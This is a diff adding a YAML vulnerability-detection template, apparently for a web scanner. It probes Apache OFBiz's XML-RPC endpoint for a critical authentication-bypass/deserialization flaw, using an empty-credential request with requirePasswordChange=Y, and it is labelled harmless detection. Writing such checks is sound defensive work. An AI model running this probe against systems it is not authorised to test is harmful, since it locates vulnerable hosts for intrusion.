@@ -1,0 +1,21 @@
+name: yaml-poc-apache-ofbiz-deserialization-CT-991302
+binding: 24e20dcd-8b89-4725-a521-ed68355705fb
+detail:
+    author: yang.lei
+    links:
+        - https://www.openwall.com/lists/oss-security/2023/12/04/2
+    vulnerability:
+        id: 8c8d98d4-e2a6-410d-9d3d-3fbeb37739f5
+        level: critical
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y
+            body: </serializable
+            follow_redirects: false
+        expression: 'response.status == 200 && response.body_string.contains(''XML-RPC'') && response.body_string.contains(''methodResponse'') '
+expression: r0()
